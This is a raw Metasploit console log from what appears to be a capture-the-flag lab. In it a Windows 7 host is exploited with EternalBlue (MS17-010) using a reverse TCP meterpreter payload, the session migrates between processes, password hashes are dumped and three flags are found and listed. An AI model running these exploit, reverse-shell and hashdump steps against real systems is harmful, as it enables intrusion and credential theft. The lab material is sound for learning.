 1616  704   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2
                                                                                Config.exe
 1940  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2076  828   WmiPrvSE.exe
 2348  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2368  704   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2544  1300  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2560  704   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2640  704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 3004  792   powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\p
                                                                                owershell.exe
 3036  556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 3052  704   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM

meterpreter > migrate 3052
[*] Migrating from 3004 to 3052...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 3036
[*] Migrating from 3004 to 3036...

[*] 10.10.237.234 - Meterpreter session 2 closed.  Reason: Died

^C[-] migrate: Interrupted
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                    Connection
  --  ----  ----               -----------                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.  10.18.21.236:4444 -> 10.10.237.234:49251 (10.1
                               7601] -----                                    0.237.234)

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.18.21.236:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                    Connection
  --  ----  ----               -----------                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.  10.18.21.236:4444 -> 10.10.237.234:49251 (10.1
                               7601] -----                                    0.237.234)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -
[*] Stopping exploit/multi/handler


Active sessions
===============

  Id  Name  Type               Information                                    Connection
  --  ----  ----               -----------                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.  10.18.21.236:4444 -> 10.10.237.234:49251 (10.1
                               7601] -----                                    0.237.234)

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                    Connection
  --  ----  ----               -----------                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.  10.18.21.236:4444 -> 10.10.237.234:49251 (10.1
                               7601] -----                                    0.237.234)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
C:\Windows\system32>

C:\Windows\system32>

C:\Windows\system32>exit
exit

[*] 10.10.237.234 - Command shell session 1 closed.  Reason: User exit
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

No active sessions.

msf6 post(multi/manage/shell_to_meterpreter) > back
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] Using configured payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.237.234    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                             s/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows S
                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2,
                                              Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.21.236     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.21.236:4444 
[*] 10.10.237.234:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.237.234:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.237.234:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.237.234:445 - The target is vulnerable.
[*] 10.10.237.234:445 - Connecting to target for exploitation.
[+] 10.10.237.234:445 - Connection established for exploitation.
[+] 10.10.237.234:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.237.234:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.237.234:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.237.234:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.237.234:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.237.234:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.237.234:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.237.234:445 - Sending all but last fragment of exploit packet
[*] 10.10.237.234:445 - Starting non-paged pool grooming
[+] 10.10.237.234:445 - Sending SMBv2 buffers
[+] 10.10.237.234:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.237.234:445 - Sending final SMBv2 buffers.
[*] 10.10.237.234:445 - Sending last fragment of exploit packet!
[*] 10.10.237.234:445 - Receiving response from exploit packet
[+] 10.10.237.234:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.237.234:445 - Sending egg to corrupted connection.
[*] 10.10.237.234:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.10.237.234
[+] 10.10.237.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.237.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.237.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 3 opened (10.18.21.236:4444 -> 10.10.237.234:49273) at 2024-04-09 22:30:48 +0200

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 444   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 556   548   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 604   548   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 616   596   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 656   596   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 704   604   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 712   604   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 720   604   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 772   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 828   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 896   704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 944   704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1012  656   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1076  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1160  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1336  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1404  704   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent
                                                                                .exe
 1416  704   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 1472  704   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.e
                                                                                xe
 1616  704   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2
                                                                                Config.exe
 1940  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2076  828   WmiPrvSE.exe
 2348  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2368  704   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2560  704   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2640  704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2928  704   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 3052  704   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 444   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 556   548   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 604   548   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 616   596   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 656   596   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 704   604   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 712   604   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 720   604   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 772   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 828   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 896   704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 944   704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1012  656   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1076  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1160  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1336  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1404  704   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent
                                                                                .exe
 1416  704   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 1472  704   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.e
                                                                                xe
 1616  704   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2
                                                                                Config.exe
 1940  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2076  828   WmiPrvSE.exe
 2348  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2368  704   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2560  704   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2640  704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2928  704   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 3052  704   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM

meterpreter > migrate 3052
[*] Migrating from 2928 to 3052...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2640
[*] Migrating from 2928 to 2640...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2928
[-] Process already running at PID 2928
meterpreter > migrate 2560
[*] Migrating from 2928 to 2560...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 1616
[*] Migrating from 2928 to 1616...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
[-] Error while running command hashdump: undefined method `id' for nil:NilClass

Call stack:
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/passwd.rb:63:in `report_creds'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/passwd.rb:43:in `block in cmd_hashdump'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/passwd.rb:40:in `each'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/passwd.rb:40:in `cmd_hashdump'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:160:in `block in run'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:35:in `with_context'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:574:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1749:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:198:in `cmd_exploit'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:35:in `with_context'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:23:in `<main>'
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > cd ..
PS > cd..
PS > ls

    Directory: C:\

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         7/13/2009  10:20 PM            PerfLogs
d-r--         3/17/2019   5:22 PM            Program Files
d-r--         3/17/2019   5:28 PM            Program Files (x86)
d-r--        12/12/2018   9:13 PM            Users
d----         3/17/2019   5:36 PM            Windows
-a---         3/17/2019   2:27 PM         24 flag1.txt

PS > gc flag1.txt
flag{access_the_machine}
PS > ^C
Terminate channel 1? [y/N]  y
meterpreter > search -f 
^C[-] search: Interrupted
meterpreter > help search
[-] No help for search, try -h
meterpreter > search -h
Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...
Search for files.

OPTIONS:

    -a   Find files modified after timestamp (UTC).  Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
    -b   Find files modified before timestamp (UTC). Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
    -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
    -f   A file pattern glob to search for. (e.g. *secret*.doc?)
    -h   Help Banner
    -r   Recursively search sub directories. (Default: true)

meterpreter > search *.txt
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc

meterpreter > search -f flag2.txt
Found 1 result...
=================
Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Windows\System32\config\flag2.txt  34            2019-03-17 20:32:48 +0100

meterpreter > cat c:/Windows/System32/config/flag2.txt
flag{sam_databsearch -f flag3.txtWindows/System32/config/flag2.txt
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\Jon\Documents\flag3.txt  37            2019-03-17 20:26:36 +0100

meterpreter > cat c:/Users/Jon/Documents/flag3.txt
flag{admin_documents_can_be_valuable}meterpreter > 

```

`flag{access_the_machine}`
`flag{sam_database_elevated_access}`
`flag{admin_documents_can_be_valuable}`
